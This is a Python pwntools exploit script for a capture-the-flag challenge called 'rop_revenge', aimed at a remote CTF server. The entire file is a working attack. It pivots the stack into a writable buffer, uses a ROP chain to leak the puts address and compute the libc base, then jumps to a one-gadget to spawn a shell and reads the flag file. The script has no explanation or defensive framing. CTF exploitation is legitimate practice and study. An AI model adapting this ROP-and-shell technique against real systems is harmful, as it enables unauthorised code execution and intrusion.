from pwn import *
import time
context.arch = 'amd64'
local = False
if local:
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    r = process('./rop_revenge')
else:
    libc = ELF('./libc.so.6')
    r = remote('ctf.adl.csie.ncu.edu.tw', 11009)
elf = ELF('./rop_revenge')
buf1 = 0x601080 + 0x140
# buf2 = buf1+72
buf2 = 0x602000 - 0x200
puts_plt = elf.symbols['puts']
system_plt = libc.symbols['system']
puts_got = 0x601018
read = 0x4006aa
leave_ret = 0x00000000004006d4
ret = 0x00000000004004e1
pop_rdi = 0x0000000000400743
pop_rbp = 0x00000000004005a5
pop_rsi_r15 = 0x0000000000400741
payload = 'a' * 32 + flat([buf1, leave_ret])
rop1 = flat(['a' * 0x140, buf2, pop_rdi, puts_got, puts_plt, read])
r.recvuntil('name?')
r.send(rop1)
r.recvuntil('to say?')
r.send(payload)
r.recvuntil('Hacker go away~\n')
puts_addr = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + system_plt
print "libc_base:", hex(libc_base)
rop2 = 'a' * 40 + flat([libc_base + 0x45206])
time.sleep(0.5)
r.send(rop2)
time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")
r.interactive()
